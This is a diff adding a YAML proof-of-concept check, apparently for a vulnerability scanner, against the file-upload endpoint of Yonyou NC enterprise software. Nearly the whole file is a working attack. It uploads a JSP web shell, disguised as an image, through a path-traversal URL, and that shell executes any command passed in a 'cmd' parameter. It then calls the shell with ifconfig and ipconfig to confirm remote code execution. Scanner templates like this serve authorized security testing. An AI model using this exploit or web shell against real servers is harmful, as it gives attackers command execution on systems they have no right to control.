@@ -1,0 +1,44 @@
+name: poc-yaml-yongyouNC-uploadControl-uploadFile-File-upload
+transport: http
+  
+
+
+rules:
+  r0:
+    request:
+      method: POST
+      path: /mp/initcfg/../uploadControl/uploadFile
+      headers:
+        Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryHHaZAYecVOf5sfa6
+      body: "\
+        ------WebKitFormBoundaryHHaZAYecVOf5sfa6\r\n\
+        Content-Disposition: form-data; name=\"file\"; filename=\"rce.jsp\"\r\n\
+        Content-Type: image/jpeg\r\n\
+        \r\n\
+        <% java.io.InputStream in = Runtime.getRuntime().exec(request.getParameter(\"cmd\")).getInputStream();int a = -1;byte[] b = new byte[2048];out.print(\"<pre>\");while((a=in.read(b))!=-1){out.println(new String(b,0,a));}out.print(\"</pre>\");new java.io.File(application.getRealPath(request.getServletPath())).delete();%>\r\n\
+        ------WebKitFormBoundaryHHaZAYecVOf5sfa6\r\n\
+        Content-Disposition: form-data; name=\"submit\"\r\n\
+        \r\n\
+
+        上传\r\n\
+       ------WebKitFormBoundaryHHaZAYecVOf5sfa6--\r\n\
+        "
+    expression: response.status == 200
+
+  r1:
+    request:
+      method: GET
+      path: /mp/uploadFileDir/rce.jsp?cmd=ifconfig
+    expression: response.status == 200 && response.body.bcontains(b'eth0')
+
+  r2:
+    request:
+      method: GET
+      path: /mp/uploadFileDir/rce.jsp?cmd=ipconfig
+    expression: response.status == 200 && response.body.bcontains(b'Windows IP')
+expression: r0() && r1() || r2()
+
+detail:
+  author: Superhero
+  links:
+    - https://blog.csdn.net/m0_60571842/article/details/139666069
